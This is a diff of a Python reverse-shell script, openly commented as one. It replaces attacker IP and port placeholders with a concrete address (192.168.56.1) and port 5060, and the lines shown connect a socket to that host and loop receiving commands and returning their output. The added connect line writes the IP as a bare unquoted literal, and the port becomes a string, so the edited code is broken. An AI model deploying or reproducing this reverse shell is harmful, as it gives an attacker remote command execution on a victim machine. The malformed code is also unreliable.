@@ -2,8 +2,8 @@ import socket
 import subprocess
 
 # Define the attacker's IP address and port to establish the reverse shell connection
-attacker_ip = 'ATTACKER_IP_ADDRESS'
-attacker_port = ATTACKER_PORT_NUMBER
+attacker_ip = '192.168.56.1'
+attacker_port = '5060'
 
 def establish_reverse_shell():
     # Create a socket object
@@ -11,7 +11,7 @@ def establish_reverse_shell():
 
     try:
         # Connect to the attacker's machine
-        sock.connect((attacker_ip, attacker_port))
+        sock.connect((192.168.56.1, 5060))
 
         # Receive commands from the attacker and send back the output
         while True:
